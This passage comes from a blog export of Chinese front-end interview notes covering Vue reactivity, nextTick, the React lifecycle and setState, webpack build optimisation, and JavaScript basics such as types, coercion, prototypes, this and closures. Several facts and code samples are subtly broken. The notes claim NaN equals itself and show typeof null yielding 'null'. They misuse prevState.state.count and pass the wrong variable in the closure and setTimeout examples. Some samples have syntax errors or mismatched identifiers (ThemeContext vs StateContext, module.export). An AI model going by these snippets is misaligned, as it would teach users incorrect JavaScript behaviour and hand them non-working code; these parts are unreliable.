内部通过重写函数的方式改写了这个问题。 Vue 提供了一个 API 解决 1234567891011121314151617181920212223242526export function set (target: Array&lt;any&gt; | Object, key: any, val: any): any &#123; // 判断是否为数组且下标是否有效 if (Array.isArray(target) &amp;&amp; isValidArrayIndex(key)) &#123; // 调用 splice 函数触发派发更新 // 该函数已被重写 target.length = Math.max(target.length, key) target.splice(key, 1, val) return val &#125; // 判断 key 是否已经存在 if (key in target &amp;&amp; !(key in Object.prototype)) &#123; target[key] = val return val &#125; const ob = (target: any).__ob__ // 如果对象不是响应式对象，就赋值返回 if (!ob) &#123; target[key] = val return val &#125; // 进行双向绑定 defineReactive(ob.value, key, val) // 手动派发更新 ob.dep.notify() return val&#125; 对于数组而言，Vue 内部重写了以下函数实现派发更新 1234567891011121314151617181920212223242526272829303132333435363738// 获得数组原型const arrayProto = Array.prototypeexport const arrayMethods = Object.create(arrayProto)// 重写以下函数const methodsToPatch = [ 'push', 'pop', 'shift', 'unshift', 'splice', 'sort', 'reverse']methodsToPatch.forEach(function (method) &#123; // 缓存原生函数 const original = arrayProto[method] // 重写函数 def(arrayMethods, method, function mutator (...args) &#123; // 先调用原生函数获得结果 const result = original.apply(this, args) const ob = this.__ob__ let inserted // 调用以下几个函数时，监听新数据 switch (method) &#123; case 'push': case 'unshift': inserted = args break case 'splice': inserted = args.slice(2) break &#125; if (inserted) ob.observeArray(inserted) // 手动派发更新 ob.dep.notify() return result &#125;)&#125;) 编译过程Vue 会通过编译器将模板通过几个阶段最终编成为 render 函数，然后通过执行 render 函数生成 Virtual DOM 最终映射为真实 DOM 这个阶段分成三部分： 将模板解析为 AST 优化 AST 将 AST 转换为 render 函数 第一个阶段，通过正则表达式去匹配模板中的内容，然后将内容提取出来做各种逻辑操作，接着会生成一个基本的 AST 对象 1234567891011121314&#123; // 类型 type：1， // 标签 tag, // 属性列表 attrsList:attrs, // 属性映射 attrsMap:makeAttrsMap（attrs）, // 父节点 parent, // 子节点 children:[]&#125; 然后会根据这个最基本的 AST对象的属性，进一步扩展 AST 当然在这一阶段中，还会进行其他的一些判断逻辑。比如说对比前后开闭标签是否一致，判断根组件是否只存在一个，判断是否符合 HTML5 Content Model 规范等等问题。 优化 AST 阶段，对节点进行了静态内容提取，将永远不会变动的节点拿出来，实现复用 Virtual DOM,跳过对比算法的功能。 最后一个阶段，通过 AST 生成 render 函数，主要的目的是遍历整个 AST,根据不同的条件生成不同的代码 NextTick 原理浅析nextTick 可以让我们在下次 DOM 更新循环结束之后执行延迟回调，用于获得更新后的 DOM 默认使用 microtasks，但是特殊情况下会使用 macrotasks，比如 v-on 对于实现 macrotasks，会先判断是否能使用 setImmediate，不能的话就降级为 MessageChannel，以上都不行的话就使用 setTimeout 12345678910111213141516if (typeof setImmediate !== 'undefined' &amp;&amp; isNative(setImmediate)) &#123; macroTimerFunc = () =&gt; &#123; setImmediate(flushCallbacks) &#125;&#125; else if (typeof MessageChannel !== 'undefined' &amp;&amp; (isNative(MessageChannel) || MessageChannel.toString() === '[object MessageChannelConstructor]')) &#123; const channel = new MessageChannel(); const port = channel.port2; channel.port1.onmessage = flushCallbacks; macroTimerFunc = () =&gt; &#123; port.postMessage(1) &#125;&#125; else &#123; macroTimerFunc = () =&gt; &#123; setTimeout(flushCallbacks, 0) &#125;&#125; React 常考的基本知识点声明周期v16 版本中引入了 Fiber 机制，这个机制一定程度上影响了部分生命周期函数的调用，也引入了新的两个 API 来解决问题。关于 Fiber 之前版本的 react如果嵌套太多层，会导致调用栈过长，再加上复杂的操作，就可能导致长时间阻塞主线程，带来不好的用户体验。就类似潜水员，只有潜到底才会回到水面。而如果水面这时候发生了其他优先级更高的事情，也要等潜水员潜到底后再重新上来。 Fiber 就是为了解决这个问题而生的，它本质上是一个虚拟的堆栈帧，新的调度器hi根据优先级自由调用这些帧，从而将之前的同步渲染变成了异步渲染，在不影响体验的情况下去分段计算更新。 优先级的区别，对于动画这种优先性别很高的东西，16ms 必须渲染一次保证不卡顿的情况下，react 会每 16ms 以内暂停一次更新，返回来继续渲染动画。潜水员不再一直潜到底，而是潜到一定深度后在该点设置一个传送点后浮出水面，然后传回去传送点继续下潜。 对于异步渲染，有三个阶段：reconcliiation 和 commit ，前者过程是可以打断的，后者不能暂停，会一直更新界面直到完成。 Reconciliation 阶段 componentWillMount componentWillReceiveProps shouldComponentUpdate componentWillUpdate Commit 阶段 componentDidMount componentDidUpdate componentWillUnmount 因为前者是可以被打断的，所以 Reconciliation 阶段会执行的声明周期函数就可能会出现调用多次的情况，从而引起 bug。因此对于 Reconciliation 阶段调用的几个函数，除了 shouldComponentUpdate 之外，其他都应该避免去使用，并且 V16 中也引入了新的 API 来解决这个问题 getDerivedStateFromProps 用于替换 componentWillReciveProps，这个函数会在初始化和 update 时候被调用。 1234567891011121314151617class ExampleComponent extends React.Component &#123; // Initialize state in constructor, // Or with a property initializer. state = &#123;&#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; if (prevState.someMirroredValue !== nextProps.someValue) &#123; return &#123; derivedData: computeDerivedState(nextProps), someMirroredValue: nextProps.someValue &#125;; &#125; // Return null to indicate no change to state. return null; &#125;&#125; getSnapshotBeforeUpdate 用于替换 componentWillUpdate ，该函数会在 update 后 DOM 更新前被调用，用于读取最新的 DOM 数据。 setStatesetState 是异步的，调用这个函数不会马上引起 state 的变化 1234567handle()&#123; console.log(this.state.count); // 0 this.setState(&#123;count:this.state.count+1&#125;); this.setState(&#123;count:this.state.count+1&#125;); this.setState(&#123;count:this.state.count+1&#125;); console.log(this.state.count) // 0&#125; 上面的代码等同于下面 123456Object.assign( &#123;&#125;, &#123;count:this.state.count+1&#125;, &#123;count:this.state.count+1&#125;, &#123;count:this.state.count+1&#125;) 可以通过下面的方式来实现我们原来的目的 12345handle()&#123; this.setState((prevState)=&gt;(&#123;count:prevState.state.count+1&#125;)); this.setState((prevState)=&gt;(&#123;count:prevState.state.count+1&#125;)); this.setState((prevState)=&gt;(&#123;count:prevState.state.count+1&#125;));&#125; 在每次 setState 后取得正确的 state，可以这样实现： 12345handle()&#123; this.setState((prevState)=&gt;(&#123;count:prevState.count+1&#125;),()=&gt;&#123; console.log(this.state); &#125;)&#125; 性能优化在 shouldComponentUpdate 函数中我们可以通过返回布尔值来决定当前组件是否需要更新。 通过 immutable 或者 immer 这些库来生成不可变对象。这类库对于操作大规模的数据来说会提升不错的性能，并且一旦改变数据就会生成一个新的对象，对比前后 state 是否一致也就方便多了。 单纯的浅比较一下，可以直接使用 PureComponent，底层就是实现了浅比较 state。 123456789class Test extends React.PureComponent &#123; render() &#123; return ( &lt;div&gt; PureComponent &lt;/div&gt; ) &#125;&#125; V16 之后可以使用 React.memo 来实现相同的功能 12345const Test = React.memo(()=&gt;&#123; &lt;div&gt; PureComponent &lt;/div&gt; &#125;) 通过这种方式我们就可以既实现了 shouldComponentUpdate 的浅比较，又能够使用函数组件。 组件通信同样的情况： 父子组件 兄弟组件 跨多层次组件 任意组件 父子组件父组件通过 props 传递数据给子组件，子组件通过调用父组件传来函数传递给父组件，这两种方式是最常用的父子通信的方法。 这种父子通信方式也就是典型的单向数据流，父组件通过 props 传递数据，子组件不能直接修改 props,而是必须通过调用父组件函数的方式来告知父组件修改数据 兄弟组件与这种情况可以通过共同的父组件来管理状态和事件函数。比如其中给一个兄弟组件调用父组件传递过来的事件函数修改父组件中的状态，然后父组件将状态传递给另一个兄弟组件 跨多层次组件使用 Context API 123456789101112131415161718192021222324// 创建 Context，可以在开始就传入值const StateContext = React.createContext();class Parent extends React.Component&#123; render()&#123; // value 就是传入 Context 中的值 &lt;StateContext.Provider value='haha'&gt; &lt;Child/&gt; &lt;/StateContext.Provider&gt; &#125;&#125;class Child extends React.Component&#123; render()&#123; return( &lt;ThemeContext.Consumer&gt; // 取出值 &#123;context=&gt;&#123; name is &#123;context&#125; &#125;&#125; &lt;/ThemeContext.Consumer&gt; ) &#125; &#125; 任意组件这种方式可以通过 Redux、Mobx 等工具 或者 Event Bus 解决。 HOC 是什么？相比 mixins 有什么优点例子 123function add(a,b)&#123; return a + b&#125; 给这个 add 函数添加一个输出结果的功能，实现优雅并且可以复用和扩展： 12345678910function withLog(fn)&#123; function wrapper(a,b)&#123; const result = fn(a,b); console.log(result); return result; &#125; return wrapper;&#125;const withLogAdd = withLog(add);withLogAdd(); 这种做法在函数式编程里面被称为高阶函数。高阶组件和高阶函数就是同一个东西，实现一个函数，传入一个组件，然后在函数内部再实现一个函数切扩展传入的组件，最后返回一个新的组件，这就是高阶组件的概念，作用是为了更好的复用代码。 HOC 和 Vue 中的 mixins 作用是一致的，并且在早期的 React 也是使用 mixins 的方式。但是在使用 class 的方式创建组件以后，mixins 的方式就不能使用了，并且其实 mixins 也是存在一些问题的，比如： 隐含了一些依赖，多人开发，我写了某个state 并且在 mixins 中使用了，这就存在一个依赖关系。其他人要移除就要去 mixins 里面查找依赖 多个 mixin 中可能存在同名的函数，会造成函数重写 雪球效应，一个mixin 被多个组件使用，会由于需求使得 mixin 变得臃肿。 HOC 解决了这些问题，并且它们达成的效果也是一致的，同时也更加函数式了。 事件机制12345const Test = (&#123;list,handleClick&#125;)=&gt;&#123; list.map((item,index)=&gt;( &lt;span onClick=&#123;handleClick&#125; key=&#123;index&#125;&gt;&#123;index&#125;&lt;/span&gt; ))&#125; JSX 上写的事件并没有绑定在对应真实的 DOM 上，而是通过事件代理的方式，将所有的事件都统一绑定在 document上，这样的方式不仅可以减少内存的损耗，还能在组件挂载时统一订阅和移除事件。 另外冒泡到 document 上的事件也不是原生的浏览器事件，而是 React自己实现的合成事件（SyntheticEvnet）。因此我们不想要事件冒泡的话，可以使用 event.preventDefault 合成事件的目的： 抹平了浏览器之间的兼容问题，另外一个是跨浏览器原生事件包装器，赋予了跨浏览器开发的能力 对于原生浏览器来说，浏览器会给监听器创建一个事件对象，如果有很多事件监听就要分配很多事件对象会造成高额的内存分配问题。但是对于合成事件来说，有一个事件池专门来管理它们的创建和销毁，当事件需要被使用的时候，就会从池子中复用对象，事件回调结束后，就会销毁事件对象上的属性，从而便于下一次复用事件对象。 Webpack性能优化减少webpack 打包时间优化 loader影响打包效率第一个必定是 babel，因为 babel hi将代码转为字符串生成 AST，然后对 AST 继续进行转变最后再生成新的代码，项目越大，转换代码越多，效率越低。 可以优化 loader 的文件搜索范围 123456789101112module.exports = &#123; module:&#123; rules:&#123; // 只对 js 文件使用 babel test:/\.js$/, loader:'babel-loader', // 只在 src 文件夹下查找 include:[resolve('src')], exclude:/node_module/ &#125; &#125;&#125; 还可以将 babel 编译过的文件缓存起来，下次只需要编译更改过的代码文件就可以了,这样可以大幅度加快打包速度 1loader:'babel-loader?cacheDirectory=true' HappyPack受限于 Node 是单线程的，所以 Webpack 在打包的过程中也是单线程的，特别是在执行 Loader 的时候，长时间编译的任务很多，这样就会导致等待的情况。 HappyPack 可以将 loader 的同步执行转换为并行的，这样就可以充分利用系统的资源来加快打包效率了 123456789101112131415161718module:&#123; loaders:[&#123; test:/\.js$/, include:[resolve('src')], exclude:/node_module/, // id 后面的内容对应下面的 loader:'happypack/loader?id=happybabel' &#125;]&#125;plugins:[ new HappyPack(&#123; id:'happybabel' &#125;), loaders:['babel-loader?cacheDirectory'], // 开启四个线程 threads:4] DllPluginDllPlugin 可以将特定的类库提前打包然后引入。这种方式可以极大的减少打包类库的次数，只有当类库更新版本才有需要打包，并且也实现了将公告代码抽离出成单独文件的优化方案。 123456789101112131415161718192021222324// 单独配置在一个文件中// webpack.dll.conf.jsconst path = require('path');const webpack = require('webpack');module.export = &#123; enrty:&#123; vendor:['react'] &#125;, plugins:[ new webpack.DllPlugin(&#123; // 与 output.library 一致 name:'[name]-[hash]', // 与 DllReferencePlugin 中一致 context:__dirname, path:path.join(__dirname,'dist','[name]-mainfest.json') &#125;) ], output:&#123; path:path.join(__dirname,'dist'), filename:'[name].dll.js', library:'[name]-[hash]' &#125;&#125; 然后运行这个配置文件生成依赖文件，使用 DllReferencePlugin 将依赖文件引入项目中 1234567891011// webpack.conf.jsmodule.export = &#123; // 省略其他配置 plugins:[ new webpack.DllReferencePlugin(&#123; context:__dirname, // 之前打包出来的 json文件 mainfest:require('./dist/vendor-mainfest.json') &#125;) ]&#125; 减少webpack 打包后的体积按需加载 SPA 项目中都会存在十几甚至更多的路由页面。如果我们将这些页面全部打包进一个 JS 文件的话，虽然将多个请求合并了，但是同样也加载了很多并不需要的代码，耗费了更长的时间。那么为了首页能更快地呈现给用户，我们肯定是希望首页能加载的文件体积越小越好，这时候我们就可以使用按需加载，将每个路由页面单独打包为一个文件。当然不仅仅路由可以按需加载，对于 loadash 这种大型类库同样可以使用这个功能。 底层的机制都是当使用的时候再去加载对应的文件，返回一个 Promis ，当 Promise 成功以后去执行回调 Scope Hoisting Scope Hoisting 会分析出来模块之间的依赖关系，尽可能的把打包的模块合并到一个函数中去 比如打包两个文件 1234// test.jsexport const a = 1// index.jsimport &#123;a&#125; from './test.js' 打包出来的代码是这样的 12345678910[ /* 0 */ function (module, exports, require) &#123; //... &#125;, /* 1 */ function (module, exports, require) &#123; //... &#125; ] 但是如果我们使用 Scope Hoisting 的话，代码就会尽可能的合并到一个函数中去，也就变成了这样的类似代码 123456[ /* 0 */ function (module, exports, require) &#123; //... &#125;] 在webpack4 中只要启用 optimization.concatenateModules 就可以了 12345module.exports = &#123; optimization:&#123; concatenateModules:true &#125;&#125; Tree Shaking Tree Shaking 可以实现删除项目中未被引用的代码，例如： 12345// test.jsexport const a = 1export const b = 2// index.jsimport &#123; a &#125; from './test.js' 对于以上情况，test 文件中的变量 b 如果没有在项目中使用到的话，就不会被打包到文件中。 如果你使用 Webpack 4 的话，开启生产环境就会自动启动这个优化功能。]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>前端面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试题目汇总摘录（JS 基础篇2）]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-JS%20%E5%9F%BA%E7%A1%80%E7%AF%872.html</url>
    <content type="text"><![CDATA[温故而知新，保持空杯心态,复习到一半的时间，突然发现了 前端面试之道，从第二道题目开始按学习这本书的路径来 JS 基础2React/Vue 项目时为什么要在组件中写 key，其作用是什么？ key是给每一个vnode的唯一id,可以依靠key,更准确, 更快的拿到oldVnode中对应的vnode节点。 key 的作用是为了在 diff 算法执行时更快的找到对应的节点，提高 diff 速度。 Vue 和 React 都是采用 diff 算法来对比新旧虚拟节点，从而更新节点。在 vue 中的 diff 函数，交叉对比中，当新节点跟旧节点 头尾交叉对比没有结果的时候，会根据新节点的 key 对比旧节点数组中的 key，从而找到对应旧节点。如果没有找到就认为是一个新增节点。而如果没有 key，那么就会采用遍历查找的方法找到对应的旧节点。。一种一个map 映射，另一种是遍历查找。相比之下，map 映射的速度更快。 vue 部分源码： 12345678910111213141516171819202122232425262728293031// oldCh 是一个旧虚拟节点数组if(isUndef(oldKeyToIdx))&#123; oldKeyToIdx = createKeyToOldIdx(oldCh,oldStartIdx,oldEndIdx);&#125;if(isDef(newStartVnode.key))&#123; // map 方式获取 idxInOld = oldKeyToIdx[newStartVnode.key]&#125;else&#123;// 遍历方式获取 idxInOld = findIdxInOld(newStartVnode, oldCh, oldStartIdx, oldEndIdx) &#125;// 创建 map 函数function createKeyToOldIdx(children,beginIdx,endIdx)&#123; let i,key; const map = &#123;&#125;; for(i = beginIdx;i &lt;= endIdx,++i)&#123; key = children[i].key; if(isDef(key) map[key] = i; &#125; return map;&#125;// 遍历寻找// sameVnode 是对比新旧节点是否相同的函数function findIdxInOld(node,oldCh,start,end)&#123; for(let i=start;i&lt;end;i++)&#123; const c = oldCh[i]; if(isDef(c) &amp;&amp; sameVnode(node,c)) return i; &#125;&#125; [“1”,”2”,”3”].map(parseInt)解析1['10','10','10','10','10'].map(parseInt); // [10,NaN,2,3,4] parseInt(string,radix) 参数： string:要被解析的值，如果参数不是一个字符串，则将其转换成字符串。字符串开头的空白符会被忽略。 radix:一个介于2 和 36 的整数，表示上述字符串的基数。比如参数10 表示我们通常用的十进制数值系统。始终指定该参数可以消除阅读的困惑并且保证转换结果可预测。当未指定基数时，不同的实现会产生不同的结果，通常将值默认是10. 返回值:返回解析的整数值。如果被解析参数的第一个字符无法被转换为数值类型，则返回 NaN 注意：radix参数为n 会把第一个参数看做是一个数的 n 进制表示，而返回的值是十进制的。 如果字符串string 是以 ‘0x‘ 或者 ‘0X’开头，则基数是16进制 如果字符串 string 是以 ’0‘ 开头，基数是8进制或者10进制。ES5 规定用10进制。 如果字符串string 以其他任何值开头，则默认是十进制 123parseInt(100); // 100parseInt(100,10); // 100parseInt(100,2); // 4 map map() 方法会创建一个新数组，其结果是该数组中的每个元素都调用一个提供的函数返回的结果。 123const new_array = arr.map(function callback(currentValue[,index[,array]])&#123; // return element for new_array;&#125;[,thisArg]); callback回调函数需要三个参数，我们通常只用了第一个参数（其他两个是可选的） currentValue:是 callback 数组中正在处理的当前元素。 index:可选，是 callback 数组中正在处理的当前元素的索引 array:可选，是 callback map 方法被调用的数组 另外还有 thisAry:执行 callback 函数使用的 this 值 123456789101112['10','10','10','10','10'].map(parseInt);// 相当于['10','10','10','10','10'].map((item,index)=&gt;&#123; return parseInt(item,index);&#125;);// 即是parseInt('10',0); // 10parseInt('10',1); // NaNparseInt('10',2); // 2parseInt('10',3); // 3parseInt('10',4); // 4 那么原题目也是同样的道理。 如果要将字符串数组循环变成数组可使用下面的方法 12['10','10','10','10','10'].map(Number);// [10,10,10,10,10] 内置类型JS 中分为7种内置类型，内置类型又分为两大类型：基本类型和对象（Object）[Function,Object,Array,Boolean,Number,String,Date,Error,RegExp,全局对象] 基本类型有：null,undefined,string,number,boolean,symbol 其中 JS 的数字类型是浮点类型，没有整型。NaN也是 number类型，并且 NaN等于自身 对于基本类型来说，如果使用字面量的方式，那么这个变量只是个字面量，只有在必要的时候才会被会转换为对应的类型： 12let a = 111; // 这只是字面量，不是 number 类型a.toString(); // 使用的时候才会被转换成为对象类型 对象（Object ）是引用类型，在使用过程中会遇到浅拷贝和深拷贝的问题 1234let a = &#123;name:'haha'&#125;let b = a;b.name = 'haha2'a.name; // haha2 Typeoftypeof 对于基本类型，除了 null 都可以显示正确的类型 1234567typeof 1; //'number'typeof '1'; //'string'typeof undefined; //'undefined'typeof null; //'null'typeof true; //'boolean'typeof Symbol(); //'symbol'typeof b // b 没有声明，但是还会显示 undefined typeof 对于对象，除了函数都会显示 Object 123typeof []; 'object'typeof &#123;&#125;; 'object'typeof console.log; 'function' 对于 null 来说，虽然它是基本类型。但是会显示 object ，这是一个存在很久的 Bug。在JS 的最初版本，使用的是32位系统，为了性能问题使用低位储存了变量的内部信息，000 开头代表对象，然后 null 表示全为零，所以将它错误的判断为 object 。虽然现在内部类型判断代码已经更改了，但是这个 bug 却是一直流传下来的。 如果想要获得一个变量的正确类型，可以通过 Object.prototype.call(xx)，这样就可以获得类似 [object type]的字符串 12345678910let a// 我们也可以这样判断 undefineda === undefined// 但是 undefined 不是保留字，能够在低版本浏览器被赋值let undefined = 1// 这样判断就会出错// 所以可以用下面的方式来判断，并且代码量更少// 因为 void 后面随便跟上一个组成表达式// 返回就是 undefineda === void 0 类型转换转Boolean在条件判断时，除了 undefined,null,false,NaN,&#39;&#39;,0,-0 其他所有值都转为 true,包括所有对象。 对象转基本类型对象转基本类型时，首先会调用 valueOf然后调用 toString，并且这个两个方法是可以重写的 12345let a = &#123; valueOf()&#123; return 0; &#125;&#125; 也可以重写 Symbol.toPrimitive，该方法在转基本类型时调用优先级最高 12345678910111213let a =&#123; valueOf()&#123; return 0; &#125;, toString()&#123; return '1'; &#125;, [Symbol.toPrimitive]()&#123; return 2; &#125;&#125;1 + a // 3'1' + a // 12 四则运算符加法运算规则： 其中一方是字符串类型，另外一方亦然 其中一方是数字类型，另外一方亦然 只会触发三种类型转换：值 =&gt; 原始值, =&gt; 数字，=&gt; 字符串 123456789101 + '1' // 112 * '2' // 4[1,2] +[2,1] // '1,22,1'// [1,2].toString -&gt; '1,2'// [2,1].toString -&gt; '2,1''1,2'+ '2,1' = '1,22,1'// 对于加号要注意表达式 'a'++'b''a'++ 'b' // 'aNaN'// 因为 + 'b' 等于 NaN == 操作符比较运算 x==y,其中 x 和 y 是值，产生 true 或者 false ，这样的比较按下面的方式进行： 若Type(x) 和 Type(y)相同，则 若 Type(x) 为 undefined,返回 true 若 Type(x) 为 Null,返回 true 若 Type(x) 为 Number,则 若 x 为 NaN,返回 false 若 y 为 NaN,返回 false 若 x 与 y 为相等数值，返回 true 若 x 为 +0, y 为 -0，返回 true 若 x 为 -0, y 为 +0，返回 true 返回 false 若 Type(x) 为 String,则 x 和 y 为完全相同的字符序列（长度相等且相同字符在相同位置）时返回 true,否则，返回 false 若 Type(x) 为 Boolean,当 x 和 y 同为 true 或者同为 false 时返回 true,否则，返回 false。 当 x 和 y 为引用同一对象时返回 true,否则返回 false. 若 x 为 null 且 y 为 undefined ，返回 true 若 x 为 undefined 且 y 为 null ,返回 true 若 Type(x) 为 Number,且 Type(y) 为 String,返回比较 x == toNumber(y) 的结果 若 Type(x) 为 String 且 Type(y) 为 Number,返回比较 ToNumber(x) == y 的结果 若 Type(x) 为 Boolean，返回 比较 ToNumber(x) ==y 的结果 若 Type(y) 为 Boolean,返回比较 ToNumber(y) ==x 的结果 若 Type(x) 为 String 或者 Number，且 Type(y) 为 Object,返回比较 x==ToPrimitive(y) 的结果 若 Type(y) 为 String 或者 Number，且 Type(x) 为 Object,返回比较 y==ToPrimitive(x) 的结果 返回 false toPrimitive 就是对象转基本类型 对照上面的规则，分析下面的案例 12345678910111213[] == ![] // true// 由于 ！优先级大于 ==，所以先运算右边，[] 为 true, ![] 取反为 false，得出[] == false// 根据第7条规则 ToNumber(y) ==x ，得出[] == 0// 根据第9条规则， y==ToPrimitive(x)，得出ToPrimitive([]) == 0// 即是[].toString() == 0// 得出'' == 0;// 根据第5条规则，ToNumber(x) == y 得出0 == 0 // -&gt;true 比较运算符 如果是对象，就通过 toPrimitive 转换对象 如果是字符串，就通过 unicode 字符索引来比较 原型 每个函数都有 prototype 属性，除了 Function.prototype.bind() 该属性指向原型。 每个对象都有 __proto__属性，指向了创建该对象的构造函数的原型，其实这个属性指向了 [[proptotype]]，但是 [[proptotype]]是内部属性，我们并不能访问到，所以使用 __proto__来访问。对象可以通过 __proto__来寻找不属于该对象的属性，__proto__将对象连接起来形成了原型链。 new 新生成了一个对象 链接到原型 绑定 this 返回新对象 在调用 new 的过程会发生上面四种事情，下面是自己实现的一个 new 123456789101112function create()&#123; // 创建一个空的对象 let obj = new Object(); // 获得构造函数 let Con = [].shift.call(arguments); // 链接到原型 Obj.__proto__. = Con.prototype; // 绑定 this,执行构造函数 let result = Con.apply(obj,arguments); // 确保 new 出来的是个对象 return typeof result == 'Object' ? result : obj;&#125; 对于实例对象来说，都是通过 new 产生的，无论是 function Foo(){} 还是 let a = {b:1} 对于创建一个对象来说，更推荐使用字面量的方式来创建对象（无论是性能上还是可读性）。使用 new Object 方式创建对象需要通过作用域链一层层找到 Object，但是使用字面量就没有这个困扰 1234function Foo()&#123;&#125;// function 就是个语法糖，相当于 new Function()let a = &#123;b:1&#125;// 这个字面量也是使用了 new Object(); 对于 new 来说，还需要注意下面的运算符优先级 123456789101112function Foo()&#123; return this;&#125;Foo.getName = function()&#123; console.log('1');&#125;Foo.prototype.getName = function()&#123; console.log('2');&#125;new Foo.getName(); // 1new Foo().getName(); //2 可以看出 new Foo() 优先级大于 new Foo,所以代码可以这样划分执行顺序 12new (Foo.getName())(new Foo).getName(); 对于第一个函数来说，先执行了 Foo.getName 所以结果为1，对于后者来说，先 new Foo() 产生了一个实例，然后通过原型链找到了 Foo 上面的 getName 函数，所以结果为 2 instanceofinstanceof 可以正确判断对象的类型，因为内部机制是通过判断对象的原型链是不是能找到类型的 prototype 我们也可以试着实现: 12345678910111213141516function instanceof(left,right)&#123; // 获得类型的原型 let prototype = right.prototype; // 获得对象的原型 left = left.__Proto__; // 判断对象的类型是否等于类型的原型 while(true)&#123; if(left === null)&#123; return false &#125; if(prototype === left)&#123; return true &#125; left = left.__proto__ &#125;&#125; thisthis 记住几个规则就可以了 123456789101112131415161718function foo()&#123; console.log(this.a);&#125;var a = 1;foo();var obj = &#123; a:2, foo:foo&#125;obj.foo();// 上面两种情况 this 只依赖调用函数前的对象，优先级是第二个情况大于第一个情况// 下面的优先级是最高的，this 只会绑定在c 上面，不会被任何方式修改 this 指向const c = new foo();c.a = 3;console.log(c.a); // 3//还有一种情况是利用 call,apply或者 bind 改变 this，这个优先级仅次于 new 箭头函数中的 this 12345678function a()&#123; return ()=&gt;&#123; return ()=&gt;&#123; console.log(this); &#125; &#125;&#125;console.log(a()()()); 箭头函数其实是没有 this，这个函数中的 this 只取决于外面的第一个不是箭头函数的函数的this 。在上面的例子中，因为调用 a 符合前面代码的第一种情况，所以 this 是 window，并且一旦 this 绑定上下文了，就不会被任何代码改变。 执行上下文当执行 JS 代码的时候，会产生三种执行上下文 全局执行上下文 函数执行上下文 eval 执行上下文 每个执行上下文都有三个重要的属性 变量对象（VO），包含变量、函数声明和函数的形参，该属性只能在全局上下文中访问 作用域链（JS 采用词法作用域，也就是说变量的作用域是在定义时就决定的） this 12345var a = 10;function foo(i)&#123; var b = 20;&#125;foo(); 对于上述代码，执行栈中有两个上下文：全局上下文和函数 foo 上下文 1234stack = [ globalContext, fooContext] 对于全局上下文来说，VO 大概是这样的 12345globalContext.VO === globalglobalContext.VO = &#123; a:undefined, foo:&lt;Function&gt;,&#125; 对于 函数 foo 来说，VO 不能被访问，只能访问到活动对象（AO） 1234567fooContext.VO === foo.AOfooContext.AO = &#123; i:undefined, b:undefined, arguments:&lt;&gt;&#125;// arguments 是函数底油的对象（箭头函数没有），这个对象是一个伪数组，有 length 属性可以通过下标访问元素，该对象的 callee 属性代表函数本身，caller 属性代表函数的调用者 对于作用域链，可以把它理解为包含自身变量对象和上级变量对象的列表，通过 [[Scope]] 属性查找上级变量 123456fooContext.[[Scope]] = [ globalContext.VO ]fooContext.Scope = fooContext.[[Scope]] + fooContext.VOfooContext.Scope = [ fooContext.Vo, globalContext.Vo] 举个例子，var 1234567b(); // heheconsole.log(a); // undefinedvar a = 'haha';function b()&#123; console.log('hehe');&#125; 上面的结果是因为函数和变量提升的原因。通常替身的解释是说将生命的代码移到了顶部，这其实没有什么错误，便于理解。但是更准确的解释应该是：在生成执行上下文时，会有两个阶段。第一个阶段是创建的阶段（具体步骤是创建 VO），JS 解释器会找出需要提升的变量和函数，并且给他们提前在内存中开辟好空间，函数的话会将整个函数放入内存中，变量只声明并且赋值为 undefined，所以在第二个阶段，也就是代码的执行阶段，我们可以直接提前使用。 在提升的过程中，相同的函数会覆盖上一个函数，并且函数优先于变量提升 12345678b(); //2function b()&#123; console.log('1');&#125;function b()&#123; console.log('2');&#125;var b = 'haha'; var 会产生很多错误，所以现在 ES6 中引入了 let，let 不能在声明前使用，但是这并不是常说的 let 不会提升，let 提升了声明但是没有赋值，因为临时死区导致了并不能在声明前使用 对于非匿名立即执行函数需要注意下面的问题 1234567891011var foo = 1;(function foo()&#123; foo = 10; console.log(foo);&#125;());/**ƒ foo() &#123; foo = 10 console.log(foo)&#125;*/ 因为当 JS 解释器在遇到非匿名的理解执行函数时，会创建一个辅助的特定对象，然后将函数名称作为这个对象的属性，因此函数内部才可以访问到 foo，但是这个值又是只读的，所以对它的赋值并不会生效，所以打印出来的还是这个函数，并且外部的值也没有任何改变。 1234567specialObject = &#123;&#125;Scope = specialObject + Scope;foo = new FunctionExpression;foo.[[Scope]] = Scope;specialObject.foo = foo; // &#123;DontDelete&#125;, &#123;ReadOnly&#125;delete Scope[0]; // remove specialObject from the front of scope chain 闭包闭包的定义很简单：函数 A 返回一个函数 B，并且函数 B 中使用了 函数 A 的变量，函数 B就被称为闭包 1234567function A()&#123; let a = 1; function B()&#123; console.log(a); &#125; return B;&#125; 函数 A 中的变量这时候是存储在堆上的，JS 引擎可以通过逃逸分析辨别哪些变量需要存储在对上，哪些需要存储在栈上。 循环中使用闭包解决 var 定义函数的问题 12345for(var i=1;i&lt;=5;i++)&#123; setTimeout(function timer()&#123; console.log(i) &#125;,i*1000);&#125; 首先，因为 setTimeout 是异步函数，所以回先把所有U型你换全部执行完毕，这时候 i 就是 6了，所以会输出一堆 6. 解决的方法有两种，第一种是使用闭包 1234567for(var i=1;i&lt;=5;i++)&#123; (function(j)&#123; setTimeout(function timer()&#123; console.log(j) &#125;,j*1000); &#125;)(j);&#125; 第二种是使用 setTimeout 的第三个参数 12345for(var i=1;i&lt;=5;i++)&#123; setTimeout(function timer(j)&#123; console.log(i); &#125;,i*1000,i);&#125; 第三种就是使用 let 定义 i 12345for(let i=1;i&lt;=5;i++)&#123; setTimeout(function timer()&#123; console.log(i) &#125;,i*1000);&#125; 因为对于 let 来说，会创建一个块级作用域，相当于 12345678910111213141516171819&#123; // 形成块级作用域 let i = 0; &#123; let ii = i; setTimeout(function timer()&#123; console.log(ii); &#125;,i*1000) &#125; i++ &#123; let ii = i &#125; i++ &#123; let ii = i &#125; ...&#125; 深浅拷贝123456let a = &#123; age:1&#125;let b = a;a.age = 2;b.age; // 2 从上述例子可以看出，如果给一个变量赋值一个对象，那么两者的值会是同一引用，其中一方改变，另一方也会相应改变。 通常在开发中，我们不希望出现这样的问题，我们可以使用浅拷贝来解决这个问题。 浅拷贝首先可以通过 Object.assign 来解决这个问题 1234567let a = &#123; age:1&#125;let b = 